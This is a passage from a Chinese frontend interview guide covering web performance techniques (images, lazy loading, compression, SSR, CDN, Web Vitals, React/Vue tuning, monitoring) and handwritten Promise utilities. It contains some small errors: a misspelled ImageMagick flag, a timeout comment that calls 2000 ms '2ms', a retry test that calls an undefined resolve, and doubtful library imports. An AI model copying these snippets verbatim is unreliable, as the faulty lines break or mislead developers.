// │ 原生懒加载      │ 避免白嫖   │ img loading="lazy"      │
// │ 响应式图片      │ 避免下载大 │ srcset + sizes         │
// │ 渐进式JPEG     │ 逐行显示   │ 内容丰富的大图           │
// └────────────────┴────────────┴────────────────────────┘

// WebP vs AVIF：
// WebP：兼容性极好（95%+），压缩率比JPEG高30%，透明度OK
// AVIF：压缩最强（比WebP再小30-50%），但兼容性差（Chrome/Firefox支持，Safari 16+）

// 响应式图片：
<img
  src="hero-400.jpg"
  srcset="hero-400.jpg 400w, hero-800.jpg 800w, hero-1200.jpg 1200w"
  sizes="(max-width: 600px) 400px, (max-width: 1200px) 800px, 1200px"
  alt="hero"
  loading="lazy"  <!-- 浏览器原生懒加载 -->
>

<!-- 图片格式切换：-->
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img src="hero.jpg" alt="hero">
</picture>

// CSS背景图（用于CSS图片）：
.bg {
  background-image: url('small.jpg');
  /* DPR切换 */
  background-image: -webkit-image-set(
    url('small.jpg') 1x,
    url('small@2x.jpg') 2x
  );
}

// 渐进式JPEG（Progressive JPEG）：
// 浏览器先显示模糊图，逐步变清晰
// 适合大图，用户感知体验好
// 生成：convert large.jpg -interlace JPGE -quality 85 progressive.jpg

// 图片压缩工具：
// Squoosh.app（Google官方，在线）
// sharp（Node.js）
// imagemin（CLI）
// TinyPNG（在线批量）

// 占位图（防止白屏）：
// blur占位（CSS blur+低质量缩略图先显示，图片加载完替换）
//LQIP（Low Quality Image Placeholder）
// color占位（纯色+文字骨架）
```

---

### 6. 懒加载原理

```javascript
// 懒加载：按需加载，减少首屏资源量

// 方法1：IntersectionObserver（推荐）
const observer = new IntersectionObserver(
  (entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const img = entry.target;
        img.src = img.dataset.src; // 真正地址
        observer.unobserve(img);    // 停止观察
      }
    });
  },
  { rootMargin: '200px' } // 提前200px加载（预加载）
);

// 图片标记：
// <img data-src="real.jpg" class="lazy">

// 方法2：滚动监听（古老但兼容）
let isLoading = false;
function lazyLoadImgs() {
  const imgs = document.querySelectorAll('[data-src]');
  const scrollBottom = window.scrollY + window.innerHeight;
  imgs.forEach(img => {
    if (img.offsetTop < scrollBottom + 100) {
      img.src = img.dataset.src;
      img.removeAttribute('data-src');
    }
  });
}
window.addEventListener('scroll', throttle(lazyLoadImgs, 200));

// 方法3：浏览器原生lazy
<img src="placeholder.jpg" loading="lazy" data-src="real.jpg">
// 浏览器自动处理，不需要JS

// 方法4：视频懒加载
<video poster="poster.jpg" preload="none">
  <source data-src="video.mp4">
</video>
// 进入视口后把data-src设到src
```

---

### 7. 路由懒加载原理

```javascript
// 路由懒加载：不一次性加载所有路由代码，按需加载

// React Router（React）：
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));

function App() {
  return (
    <Suspense fallback={<div>加载中...</div>}>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
      </Routes>
    </Suspense>
  );
}

// webpack 自动代码分割：
// 动态 import() 触发 webpack 的 import() 语法
// webpack 会将 import() 的模块单独打包成一个 chunk
// 路由访问时，浏览器加载对应 chunk

// Vue Router（Vue）：
const routes = [
  { path: '/', component: () => import('./views/Home.vue') },
  { path: '/about', component: () => import('./views/About.vue') }
];

// 预加载策略：
// 路由被访问后，预加载其他可能访问的路由
import { preloadRoute } from 'smart-preload';
router.beforeEach((to) => {
  if (to.meta.preload) {
    preloadRoute(to.meta.preload);
  }
});

// 预加载关键路由（在首屏完成后）：
// requestIdleCallback(() => {
//   import('./pages/DetailPage'); // 闲时加载
// });
```

---

### 8. gzip vs Brotli

```javascript
// 压缩算法对比：
// ┌──────────────┬───────────┬──────────────┬───────────────────┐
// │ 算法          │ 压缩率    │ 压缩速度     │ 支持情况           │
// ├──────────────┼───────────┼──────────────┼───────────────────┤
// │ gzip          │ 较好      │ 快           │ 所有浏览器/服务器   │
// │ brotli        │ 更好      │ 稍慢         │ 现代浏览器（95%+）  │
// │ deflate       │ 一般      │ 快           │ 老式环境           │
// └──────────────┴───────────┴──────────────┴───────────────────┘

// gzip vs brotli 压缩率对比（典型）：
// 原始JS: 500KB
// gzip:  ~150KB（70%压缩）
// brotli: ~120KB（76%压缩）

// 配置（nginx）：
// nginx.conf:
server {
  gzip on;
  gzip_types text/plain application/javascript text/css application/json image/svg+xml;
  gzip_min_length 1000;
  gzip_vary on;
}

// brotli（需要ngx_http_brotli_module）：
// brotli on;
// brotli_types text/plain application/javascript text/css application/json image/svg+xml;

// CDN压缩（大多数CDN默认支持gzip/brotli）：
// CloudFlare 自动压缩（根据Accept-Encoding）
// CDN需要配置好Content-Encoding

// 客户端解压：
// 浏览器自动解压，不需要额外处理
// Accept-Encoding: gzip, deflate, br
```

---

### 9. SSR 与性能

```javascript
// 为什么SSR提升性能：
// 1. 首屏HTML包含内容，无需等待JS
// 2. 减少HTTP请求（HTML + 关键资源）
// 3. 更好的SEO（搜索引擎直接读取内容）
// 4. 水合（hydration）后变为SPA

// Next.js SSR 示例：
// pages/index.tsx
export async function getServerSideProps() {
  const data = await fetchData(); // 服务端获取数据
  return { props: { data } };
}

// SSR vs SSG vs ISR：
// SSR：每次请求实时渲染（适合频繁更新的数据）
// SSG：构建时生成静态HTML（适合内容固定的页面）
// ISR：混合策略（静态 + 按需重新渲染）
// Next.js: getStaticProps + revalidate: 60（每60秒增量生成）

// 流式SSR（Streaming SSR）：
// React 18 Suspense + stream：
// 服务端逐步输出HTML，用户更快看到内容
function Page() {
  return (
    <div>
      <h1>Title</h1>
      <Suspense fallback={<Skeleton />}>
        <Comments />  {/* 后加载的内容 */}
      </Suspense>
    </div>
  );
}

// RSC（React Server Components）：
// 服务端组件直接渲染，不需要hydration
// 大幅减少客户端JS体积
```

---

### 10. CDN 加速原理

```javascript
// CDN工作流程：
// 用户 → CDN节点 → 缓存命中则返回 → 否则回源（fetch）→ 缓存 → 返回

// CDN 提升性能的方式：
// 1. 就近访问（减少网络延迟）
// 北京用户 → 北京CDN节点（10ms）→ 上海源站（50ms+）
// 2. 缓存静态资源（减少源站压力）
// 3. 压缩合并（部分CDN提供JS/CSS合并）
// 4. HTTP/2多路复用（单TCP连接多个请求）
// 5. TLS会话复用（减少握手延迟）
// 6. 边缘计算（Edge Functions，服务端处理）

// CDN缓存失效：
// 1. 手动失效：CDN控制台清除
// 2. 版本化URL：index.v1.js / index.v2.js
// 3. 内容hash：index.a3f2b1.js（内容不变hash不变）
// 4. 缓存头：Cache-Control + s-maxage

// 智能CDN（Edge CDN）：
// 边缘函数：Cloudflare Workers / AWS Lambda@Edge
// 在CDN节点执行代码（不需要回源处理）
```

---

### 11. Lighthouse 性能评分

```
Lighthouse 评分体系：

┌─────────────────────────────────────────────────────┐
│  Performance（性能分0-100）                          │
│    ├── FCP（首次内容绘制）                          │
│    ├── LCP（最大内容绘制）                          │
│    ├── TBT（总阻塞时间）                            │
│    ├── CLS（布局偏移）                              │
│    └── TTI（可交互时间）                            │
│                                                     │
│  Accessibility（可访问性）                           │
│  Best Practices（最佳实践）                          │
│  SEO                                                   │
│  PWA（渐进式Web应用）                                │
└─────────────────────────────────────────────────────┘

评分标准（Performance）：
- 90-100：绿，优秀
- 50-89：黄，需要改进
- 0-49：红，差

各指标含义（详见"Core Web Vitals"节）

Lighthouse 使用：
1. Chrome DevTools → Lighthouse面板
2. `npx lighthouse https://example.com --output html`
3. PageSpeed Insights（Google在线工具）
4. Chrome插件：Lighthouse Checker

优化建议：
1. 移除阻塞渲染的资源
2. 减少主线程工作（JS执行时间）
3. 优化图片（格式/大小/懒加载）
4. 减少未使用的JS/CSS
5. 使用现代图片格式（WebP/AVIF）
```

---

### 12. Core Web Vitals

```
Core Web Vitals（核心网页指标）：

┌────────────┬────────────┬────────────┬────────────────┐
│ 指标        │ 名称        │ 达标标准    │ 说明            │
├────────────┼────────────┼────────────┼────────────────┤
│ LCP        │ 最大内容绘制│ ≤2.5s      │ 首屏加载体验     │
│ CLS        │ 累积布局偏移│ ≤0.1       │ 视觉稳定性       │
│ INP        │ 交互延迟    │ ≤200ms     │ 响应速度（新TTI）│
│ FID        │ 首次输入延迟│ ≤100ms     │ 旧指标（被INP替代│
│ FCP        │ 首次内容绘制│ ≤1.8s      │ 页面开始显示     │
│ TTFB       │ 首字节时间  │ ≤0.8s      │ 服务器响应速度   │
│ TTI        │ 可交互时间  │ ≤3.8s      │ 完全可交互       │
│ TBT        │ 总阻塞时间  │ ≤200ms     │ JS阻塞主线程时间 │
└────────────┴────────────┴────────────┴────────────────┘

FID → INP：
- FID只测量第一次交互的延迟
- INP（Interaction to Next Paint）测量整个页面生命周期中所有交互
- INP = 从用户交互到下一帧渲染的最大延迟

如何优化CLS（布局偏移）：
1. 为图片/视频指定宽高（aspect-ratio）
2. 不要在内容上方动态插入广告/弹窗
3. font-display: optional（字体不阻塞，FOIT/FOUT减少）
4. 避免iframe
5. 使用CSS transform做动画（不触发重排）

如何优化LCP：
1. 优化关键内容（通常是hero图片或首屏大文本）
2. preload最大的LCP资源（<link rel="preload">）
3. 使用现代图片格式（WebP/AVIF）
4. 使用content-visibility: auto（跳过屏外渲染）
5. 服务端渲染（SSR）

如何优化INP：
1. 减少主线程阻塞（代码分割、web worker）
2. 长任务拆分（requestIdleCallback）
3. 避免大layout thrashing（批量DOM读写）
4. 减少reflow/repaint
```

---

### 13. 性能瓶颈定位

```javascript
// 性能监控工具：
// 1. Performance API（浏览器原生）
const observer = new PerformanceObserver((list) => {
  list.getEntries().forEach(entry => {
    console.log(`${entry.name}: ${entry.duration}ms`);
  });
});
observer.observe({ entryTypes: ['measure', 'paint', 'resource'] });

// 获取关键指标：
const paintEntries = performance.getEntriesByType('paint');
const lcpEntry = performance.getEntriesByName('largest-contentful-paint')[0];

// 2. Chrome DevTools Performance面板
// 录制页面操作 → 查看火焰图 → 找到长任务/重排/重绘

// 3. Chrome DevTools Network面板
// 瀑布图分析：请求排队、TTFB、下载时间

// 4. Lighthouse（自动评分+建议）
// DevTools → Lighthouse → Generate report

// 5. Web Vitals库（收集真实用户数据）
import { onCLS, onLCP, onINP, onFCP, onTTFB } from 'web-vitals';
onLCP(metric => sendToAnalytics({ name: metric.name, value: metric.value }));

// 常见瓶颈及解决：
// 1. 长任务（Long Task）> 50ms
//   解决：代码分割、web worker、requestIdleCallback

// 2. 大DOM重排（Reflow）
//   解决：批量DOM操作、transform替代top/left、使用will-change

// 3. 重复计算（Layout Thrashing）
//   解决：读写分离，不要在读里面写
function badPattern() {
  for (const el of elements) {
    const w = el.offsetWidth;     // 读（触发reflow）
    el.style.width = w + 'px';    // 写
  }
}
function goodPattern() {
  const widths = elements.map(el => el.offsetWidth); // 读
  elements.forEach((el, i) => {      // 写
    el.style.width = widths[i] + 'px';
  });
}

// 4. 大图片未压缩
//   解决：WebP + 懒加载 + 响应式srcset

// 5. JS阻塞解析
//   解决：defer/async/动态import
```

---

### 14. React 性能优化

```javascript
// React性能优化核心：

// 1. React.memo（防止不必要的重渲染）
const Button = React.memo(function Button({ onClick, children }) {
  return <button onClick={onClick}>{children}</button>;
});
// 只有props变化时才重渲染（浅比较）

// 2. useMemo（缓存计算结果）
const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);
// 依赖[a,b]不变时，返回缓存值，不重新计算

// 3. useCallback（缓存回调函数）
const handleClick = useCallback(() => {
  doSomething(a, b);
}, [a, b]);
// handleClick引用稳定，memo的子组件不会因为函数变化而重渲染

// 4. 列表使用key（稳定key，key变化才重渲染）
// key用ID不用index（index变化会导致所有子组件重渲染）
{items.map(item => <Item key={item.id} data={item} />)}

// 5. 虚拟列表（渲染大量列表项）
import { FixedSizeList } from 'react-window';
<FixedSizeList height={400} itemCount={10000} itemSize={50}>
  {({ index, style }) => <div style={style}>Row {index}</div>}
</FixedSizeList>

// 6. 组件拆分（减少粒度）
// 大组件任何props变化都重渲染，拆小后只有相关部分重渲染

// 7. Immutable数据（避免对象引用变化导致重渲染）
import { immutable } from 'react-immutable';
// 对象更新时返回新引用，组件可以通过浅比较判断变化

// 8. 懒加载（减少首屏JS量）
const HeavyChart = React.lazy(() => import('./HeavyChart'));

// 9. 状态提升 vs 状态下沉
// 频繁变化的状态放在需要它的最近父组件，避免不必要的prop传递

// 10. useTransition（标记非紧急更新）
import { useTransition } from 'react';
const [isPending, startTransition] = useTransition();
startTransition(() => { setQuery(e.target.value); });
// 用户输入（urgent）不被搜索更新（non-urgent）卡住

// 11. useDeferredValue（延迟更新值）
const [query, setQuery] = useState('');
const deferredQuery = useDeferredValue(query);
// deferredQuery可以延迟更新，配合css transition实现防抖效果

// 避免重渲染的常用模式：
// render方法中创建新对象/数组/函数 → 每次render引用都变化
function BadComponent() {
  return <Child onClick={() => console.log('click')} />; // 新函数，每次render新引用
}
function GoodComponent() {
  const handleClick = useCallback(() => console.log('click'), []); // 稳定引用
  return <Child onClick={handleClick} />;
}
```

---

### 15. Vue 性能优化

```javascript
// Vue性能优化：

// 1. computed缓存（避免重复计算）
computed: {
  // 依赖不变时不重新计算
  fullName() { return this.firstName + ' ' + this.lastName; }
}
// vs method：每次调用都重新计算

// 2. Object.freeze（冻结不变的数据）
export default {
  data() {
    return {
      // 大列表不需要响应式（更新时不需要跟踪）
      rows: Object.freeze(largeData)
    };
  },
  // 需要更新时：this.rows = Object.freeze(newData)
}

// 3. v-once（只渲染一次，不更新）
<span v-once>{{ msg }}</span>
// 用于静态内容

// 4. keep-alive（缓存组件实例）
<keep-alive include="UserList,Settings">
  <component :is="currentView" />
</keep-alive>
// 切换后不销毁组件，保留状态

// 5. v-memo（缓存子树，Vue3.2+）
<div v-memo="[item.id, item.status]">
  <ComplexComponent :item="item" />
</div>
// item.id和item.status不变时，整个div不重渲染

// 6. v-show vs v-if
// v-if：条件false时不渲染（适合不频繁切换）
// v-show：始终渲染，切换display（适合频繁切换）
// v-show不会触发组件重新创建，重渲染成本低

// 7. 路由懒加载
const routes = [
  { path: '/home', component: () => import('./Home.vue') }
];

// 8. 大列表使用虚拟滚动
// vue-virtual-scroller / vue-virtual-scroll-list

// 9. 避免深层响应式（Vue3的Proxy）
// 深层响应式有开销，大数据结构可用shallowRef
import { shallowRef } from 'vue';
const list = shallowRef(largeArray);
// 整体替换时触发更新，内部元素不变时不需要响应式追踪

// 10. 事件销毁
// 组件卸载时清理定时器、事件监听
onUnmounted(() => {
  clearInterval(this.timer);
  window.removeEventListener('resize', this.handleResize);
});
// 或者用onceEventListener（只绑定一次）

// 11. 减少watcher
// 多个相关状态合并为一个computed
```

---

### 16. 大文件上传

```javascript
// 大文件上传方案：分片 + 断点续传 + 秒传

// 分片上传原理：
// 1. 文件按固定大小分割（如2MB/片）
// 2. 每片单独上传，服务端合并
// 3. 支持并行上传多片

class Uploader {
  constructor(file, { chunkSize = 2 * 1024 * 1024, threads = 3 }) {
    this.file = file;
    this.chunkSize = chunkSize;
    this.threads = threads;
    this.uploadedChunks = new Set(); // 记录已上传的片
  }

  // 计算文件分片数
  get totalChunks() {
    return Math.ceil(this.file.size / this.chunkSize);
  }

  // 上传单片
  async uploadChunk(index) {
    const start = index * this.chunkSize;
    const end = Math.min(start + this.chunkSize, this.file.size);
    const chunk = this.file.slice(start, end);

    const formData = new FormData();
    formData.append('chunk', chunk);
    formData.append('index', index);
    formData.append('hash', await this.getChunkHash(chunk));

    await fetch('/upload/chunk', { method: 'POST', body: formData });
    this.uploadedChunks.add(index);
  }

  // 并发控制
  async upload() {
    const total = this.totalChunks;
    let uploading = 0;
    let i = 0;

    while (i < total || uploading > 0) {
      while (i < total && uploading < this.threads) {
        this.uploadChunk(i).then(() => uploading--);
        i++;
        uploading++;
      }
      await new Promise(r => setTimeout(r, 100)); // 等待
    }
  }

  // 文件hash（用于秒传判断）
  async getFileHash() {
    const hash = await crypto.subtle.digest('SHA-256',
      await this.file.arrayBuffer()
    );
    return Array.from(new Uint8Array(hash))
      .map(b => b.toString(16).padStart(2, '0')).join('');
  }

  // 秒传：上传前先询问服务端文件是否已存在
  async checkHash() {
    const hash = await this.getFileHash();
    const res = await fetch(`/upload/check?hash=${hash}`);
    const { exists, url } = await res.json();
    if (exists) { console.log('秒传成功', url); return true; }
    return false;
  }

  // 断点续传：记录已上传的片（下一次打开从断点继续）
  saveProgress() {
    localStorage.setItem('upload_' + this.file.name,
      JSON.stringify([...this.uploadedChunks])
    );
  }
}

// 服务端合并（Node.js）：
const fs = require('fs');
async function mergeChunks(filename, totalChunks) {
  const chunksDir = `./chunks/${filename}`;
  const dest = fs.createWriteStream(`./uploads/${filename}`);
  for (let i = 0; i < totalChunks; i++) {
    const chunk = fs.readFileSync(`${chunksDir}/${i}`);
    dest.write(chunk);
  }
  dest.end();
}
```

---

### 17. Web Worker 优化

```javascript
// Web Worker：将耗时计算移到后台线程，不阻塞主线程

// 创建：
const worker = new Worker('/heavy-task.js');

// 通信：
worker.postMessage({ type: 'start', data: largeArray });
worker.onmessage = e => console.log('结果', e.data);

// worker.js:
self.onmessage = e => {
  const { type, data } = e.data;
  if (type === 'start') {
    const result = heavyComputation(data);
    self.postMessage(result);
  }
};

// 使用场景：
// 1. 大量数据排序/搜索/过滤
// 2. 大数组/map/reduce
// 3. 加密解密（crypto操作）
// 4. 图片处理（Canvas + OffscreenCanvas）
// 5. JSON解析大文件

// OffscreenCanvas（将Canvas绘制移到Worker）：
const canvas = document.getElementById('myCanvas');
const offscreen = canvas.transferControlToOffscreen();
const worker = new Worker('draw-worker.js');
worker.postMessage({ canvas: offscreen }, [offscreen]);
// worker.js:
// self.onmessage = e => {
//   const ctx = e.data.canvas.getContext('2d');
//   ctx.fillRect(0, 0, 100, 100);
// };

// Comlink（简化Worker通信）：
import * as Comlink from 'comlink';
const worker = new Worker('/task.js');
const api = Comlink.wrap(worker);
// 像调用普通函数一样调用worker中的函数
const result = await api.heavyTask(data);

// Worker中不能做的事：
// 1. 操作DOM
// 2. 访问window/document（但可以访问navigator/location/fetch）
// 3. 使用某些同步API
```

---

### 18. requestIdleCallback 优化

```javascript
// requestIdleCallback：在浏览器空闲时执行低优先级任务

// 用法：
const id = requestIdleCallback(
  (deadline) => {
    // deadline.timeRemaining()：剩余空闲时间（毫秒）
    // deadline.didTimeout：是否超时
    while (deadline.timeRemaining() > 0 && tasks.length > 0) {
      const task = tasks.shift();
      task();
    }
    if (tasks.length > 0) {
      requestIdleCallback(arguments.callee);
    }
  },
  { timeout: 2000 } // 最长等待2ms后强制执行
);

// 取消：
cancelIdleCallback(id);

// 场景：后台处理大量数据，不影响用户交互
function processInIdle(data) {
  requestIdleCallback(() => {
    for (const item of data) {
      // 分批处理
    }
  });
}

// 兼容性polyfill：
window.requestIdleCallback = window.requestIdleCallback || function(cb) {
  return setTimeout(() => {
    cb({
      didTimeout: false,
      timeRemaining: () => 50 // 保守给50ms
    });
  }, 1);
};
window.cancelIdleCallback = window.cancelIdleCallback || clearTimeout;

// React的scheduler就用类似机制调度任务
```

---

### 19. 前端监控

```javascript
// 前端监控体系：
// ┌─────────────────────────────────────────────┐
// │  监控类型                                     │
// ├──────────────┬──────────────┬────────────────┤
// │ 错误监控      │ 性能监控      │ 行为监控/埋点   │
// ├──────────────┼──────────────┼────────────────┤
// │ JS错误        │ 长任务        │ 页面访问        │
// │ 资源加载错误   │ 渲染时间      │ 按钮点击        │
// │ Promise异常   │ API响应时间   │ 表单提交        │
// │ 自定义错误    │ CLS/FID/LCP │ 用户路径        │
// └──────────────┴──────────────┴────────────────┘

// 错误监控：
window.onerror = (msg, src, line, col, error) => {
  sendToServer({ type: 'error', msg, line, col, stack: error?.stack });
  return false; // 不执行默认错误处理
};

window.addEventListener('unhandledrejection', e => {
  sendToServer({ type: 'unhandledrejection', reason: e.reason });
});

// Vue错误捕获：
Vue.config.errorHandler = (err, vm, info) => {};
// React错误边界：
class ErrorBoundary extends React.Component {
  componentDidCatch(error, info) { sendToServer(...); }
}

// 性能监控（Web Vitals）：
import { onCLS, onLCP, onINP, onFCP, onTTFB } from 'web-vitals';
function sendToAnalytics({ name, value, id }) {
  // 发送到监控平台
  navigator.sendBeacon('/analytics', JSON.stringify({ name, value, id }));
}
onLCP(sendToAnalytics);
onCLS(sendToAnalytics);

// API性能监控：
const origFetch = window.fetch;
window.fetch = async (...args) => {
  const start = performance.now();
  try {
    const res = await origFetch(...args);
    sendToServer({ type: 'api', url: args[0], duration: performance.now() - start, status: res.status });
    return res;
  } catch (err) {
    sendToServer({ type: 'api', url: args[0], duration: performance.now() - start, error: true });
    throw err;
  }
};

// 埋点系统：
function track(event, properties = {}) {
  sendToServer({
    event,
    properties: { ...properties, timestamp: Date.now(), url: location.href }
  });
}
// 或者用navigator.sendBeacon（不阻塞页面卸载）
navigator.sendBeacon('/track', JSON.stringify({ event: 'page_view' }));

// 常用监控平台（前端接入）：
// Sentry（错误监控，JS/Vue/React/RN）
// 阿里云ARMS（前端监控）
// 腾讯云前端性能监控
// Datadog / New Relic
// 自建：用ClickHouse + Grafana存储和可视化

// 日志系统设计：
// 1. 采集：SDK（自动采集错误/性能，手动埋点）
// 2. 发送：sendBeacon + 批量合并（减少请求数）
// 3. 存储：日志服务（ES/ClickHouse）
// 4. 查询：Kibana/Grafana/自建看板
// 5. 告警：错误率超阈值触发告警

## 十二、手写代码终极题库

> 本章收录 30 道高频手写题，每道均有完整、可运行的实现代码。

---

### 1. 手写 Promise

```javascript
// 手写Promise：状态管理 + thenable + 链式调用
class MyPromise {
  static PENDING = 'pending';
  static FULFILLED = 'fulfilled';
  static REJECTED = 'rejected';

  constructor(executor) {
    this.state = MyPromise.PENDING;
    this.value = undefined;
    this.handlers = []; // [{onFulfilled, onRejected, promise}]

    const resolve = (value) => {
      if (this.state !== MyPromise.PENDING) return;
      if (value instanceof MyPromise) {
        // Promise套Promise：递归解析
        value.then(resolve, reject);
        return;
      }
      this.state = MyPromise.FULFILLED;
      this.value = value;
      this.handlers.forEach(h => h.onFulfilledCallback());
    };

    const reject = (reason) => {
      if (this.state !== MyPromise.PENDING) return;
      this.state = MyPromise.REJECTED;
      this.value = reason;
      this.handlers.forEach(h => h.onRejectedCallback());
    };

    try {
      executor(resolve, reject);
    } catch (e) {
      reject(e);
    }
  }

  _addHandler(onFulfilled, onRejected) {
    this.handlers.push({
      onFulfilledCallback: () => this._handleCallback(onFulfilled, true),
      onRejectedCallback: () => this._handleCallback(onRejected, false)
    });
  }

  _handleCallback(callback, isFulfilled) {
    // 异步执行回调（微任务）
    queueMicrotask(() => {
      if (typeof callback !== 'function') {
        // 没有传回调：直接传递value
        if (isFulfilled) this._resolve(this.value);
        else this._reject(this.value);
        return;
      }
      try {
        const result = callback(this.value);
        this._resolve(result);
      } catch (e) {
        this._reject(e);
      }
    });
  }

  _resolve(value) {
    // 处理thenable
    if (value && (typeof value === 'object' || typeof value === 'function')) {
      let called = false;
      try {
        const then = value.then;
        if (typeof then === 'function') {
          then.call(
            value,
            v => { if (called) return; called = true; this._resolve(v); },
            e => { if (called) return; called = true; this._reject(e); }
          );
          return;
        }
      } catch (e) { if (!called) { this._reject(e); return; } }
    }
    // 普通值：状态变为fulfilled
    this.state = MyPromise.FULFILLED;
    this.value = value;
    this.handlers.forEach(h => h.onFulfilledCallback());
  }

  _reject(reason) {
    this.state = MyPromise.REJECTED;
    this.value = reason;
    this.handlers.forEach(h => h.onRejectedCallback());
  }

  then(onFulfilled, onRejected) {
    return new MyPromise((resolve, reject) => {
      const handler = {
        onFulfilledCallback: () => {
          if (typeof onFulfilled !== 'function') {
            resolve(this.value); return;
          }
          try {
            const result = onFulfilled(this.value);
            resolve(result);
          } catch (e) { reject(e); }
        },
        onRejectedCallback: () => {
          if (typeof onRejected !== 'function') {
            reject(this.value); return;
          }
          try {
            const result = onRejected(this.value);
            resolve(result);
          } catch (e) { reject(e); }
        }
      };

      if (this.state === MyPromise.PENDING) {
        this.handlers.push(handler);
      } else if (this.state === MyPromise.FULFILLED) {
        queueMicrotask(handler.onFulfilledCallback);
      } else {
        queueMicrotask(handler.onRejectedCallback);
      }
    });
  }

  catch(onRejected) {
    return this.then(null, onRejected);
  }

  finally(fn) {
    return this.then(
      v => { fn(); return v; },
      e => { fn(); throw e; }
    );
  }

  static resolve(value) {
    if (value instanceof MyPromise) return value;
    return new MyPromise(r => r(value));
  }

  static reject(reason) {
    return new MyPromise((_, r) => r(reason));
  }
}

// 测试：
const p = new MyPromise((resolve, reject) => {
  setTimeout(() => resolve(1), 100);
});
p.then(v => v + 1).then(v => v * 2).then(console.log); // 4
```

---

### 2. 手写 Promise.all

```javascript
// Promise.all：全部成功才成功，一个失败整体reject
// 返回值顺序由输入顺序决定（即使完成顺序不同）

function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    if (!Array.isArray(promises)) {
      return reject(new TypeError('promises must be an array'));
    }
    const results = new Array(promises.length);
    let settled = 0; // 已完成数

    promises.forEach((p, i) => {
      // Promise.resolve 处理：可能是值或thenable
      Promise.resolve(p).then(
        value => {
          results[i] = value;
          if (++settled === promises.length) resolve(results);
        },
        reason => reject(reason) // 一个失败立即reject
      );
    });

    if (promises.length === 0) resolve([]);
  });
}

// 测试：
promiseAll([
  Promise.resolve(1),
  new Promise(r => setTimeout(() => r(2), 50)),
  Promise.resolve(3)
]).then(console.log); // [1, 2, 3]

promiseAll([
  Promise.resolve(1),
  Promise.reject('err'),
  Promise.resolve(3)
]).catch(e => console.log('reject:', e)); // reject: err

// 变体：Promise.allSettled（不reject，全部settle）
function promiseAllSettled(promises) {
  return Promise.all(promises.map(p =>
    Promise.resolve(p).then(
      v => ({ status: 'fulfilled', value: v }),
      e => ({ status: 'rejected', reason: e })
    )
  ));
}
```

---

### 3. 手写 Promise.race

```javascript
// Promise.race：返回最先settle（无论成功或失败）的Promise
function promiseRace(promises) {
  return new Promise((resolve, reject) => {
    promises.forEach(p => {
      Promise.resolve(p).then(resolve, reject); // 谁先settle谁决定结果
    });
  });
}

// 测试：
promiseRace([
  new Promise(r => setTimeout(() => r(1), 300)),
  new Promise((_, r) => setTimeout(() => r(2), 100)),
  new Promise(r => setTimeout(() => r(3), 200))
]).then(
  v => console.log('resolved:', v),
  e => console.log('rejected:', e)
); // rejected: 2（第二个先失败）
```

---

### 4. 手写 Promise.allSettled

```javascript
// Promise.allSettled：等所有Promise settled，不因失败而reject
function promiseAllSettled(promises) {
  return new Promise((resolve) => {
    const results = new Array(promises.length);
    let settled = 0;

    if (promises.length === 0) { resolve([]); return; }

    promises.forEach((p, i) => {
      Promise.resolve(p).then(
        value => { results[i] = { status: 'fulfilled', value }; onSettled(); },
        reason => { results[i] = { status: 'rejected', reason }; onSettled(); }
      );
    });

    function onSettled() {
      if (++settled === promises.length) resolve(results);
    }
  });
}

// 测试：
promiseAllSettled([
  Promise.resolve(1),
  Promise.reject('error'),
  new Promise((_, r) => setTimeout(() => r('late'), 100))
]).then(results => results.forEach(r => {
  if (r.status === 'fulfilled') console.log('ok:', r.value);
  else console.log('err:', r.reason);
}));
// ok: 1
// err: error
// err: late
```

---

### 5. 手写 Promise.retry

```javascript
// Promise.retry：失败后自动重试（可配置次数和间隔）
function promiseRetry(fn, { retries = 3, delay = 1000, backoff = 1 } = {}) {
  return new Promise(async (resolve, reject) => {
    let lastError;
    for (let attempt = 0; attempt <= retries; attempt++) {
      try {
        return resolve(await fn());
      } catch (e) {
        lastError = e;
        if (attempt < retries) {
          await new Promise(r => setTimeout(r, delay * Math.pow(backoff, attempt)));
        }
      }
    }
    reject(lastError);
  });
}

// 测试：
let count = 0;
promiseRetry(
  () => new Promise((_, reject) => {
    count++;
    if (count < 3) reject(new Error('fail'));
    else resolve('success');
  }),
  { retries: 3, delay: 100 }
).then(console.log, e => console.log('final error:', e));
// 打印：success（重试3次后成功）

// 变体：带指数退避（exponential backoff）
// delay * 2^attempt：1s, 2s, 4s...
// 可选加随机抖动（jitter）避免惊群效应
function retryWithBackoff(fn, { maxRetries = 5, baseDelay = 1000 } = {}) {
  return new Promise(async (resolve, reject) => {
    for (let i = 0; i <= maxRetries; i++) {
      try { return resolve(await fn()); }
      catch (e) {
        if (i === maxRetries) return reject(e);
        const delay = baseDelay * Math.pow(2, i) + Math.random() * 100;
        await new Promise(r => setTimeout(r, delay));
      }
    }
  });
}
```

---

### 6. 手写 async/await（Generator + co）

```javascript
// async是Generator的语法糖，本质相同
// 手写co函数：自动执行Generator直到完成

function co(gen) {
  return new Promise((resolve, reject) => {
    if (typeof gen === 'function') gen = gen();
    if (!gen || typeof gen.next !== 'function') return resolve(gen);

    onFulfilled();

    function onFulfilled(val) {
      let result;
      try { result = gen.next(val); }
      catch (e) { return reject(e); }
      next(result);
    }

    function onRejected(err) {
      let result;
      try { result = gen.throw(err); }
      catch (e) { return reject(e); }
      next(result);
    }

    function next({ value, done }) {
      if (done) return resolve(value);
      Promise.resolve(value).then(onFulfilled, onRejected);
    }
  });
}

// 测试：
function* gen() {
  const a = yield Promise.resolve(1);
  const b = yield Promise.resolve(a + 10);
  const c = yield Promise.resolve(b + 100);
  return c;
}
co(gen).then(v => console.log(v)); // 111

// 实际用法（模拟async）：
function asyncToGenerator(generatorFn) {
  return function(...args) {
    const gen = generatorFn.apply(this, args);
    return co(gen);
  };
}

// 手写async函数（模拟简化）：
function myAsync(fn) {
  return function(...args) {
    const gen = fn.apply(this, args);
    return co(gen);
  };
}
```

---

### 7. 手写 call

```javascript
// 手写call：调用函数，this指向第一个参数，其余参数逐个传递
Function.prototype.myCall = function(context = window, ...args) {
  // 排除null/undefined（使其指向window）
  if (context === null || context === undefined) context = window;
